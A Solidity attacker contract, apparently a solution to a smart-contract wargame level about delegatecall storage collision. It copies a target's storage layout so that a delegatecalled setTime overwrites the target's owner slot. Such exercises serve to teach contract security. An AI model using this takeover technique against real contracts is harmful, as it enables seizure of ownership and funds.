// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

contract PreservationAttacker {
    address timeZone1Library;
    address timeZone2Library;
    address public owner;

    function setTime(uint256 t) public {
        owner = address(uint160(t));
    }

    function addressToInt(address a) public pure returns (uint) {
        return uint256(uint160(a));
    }
}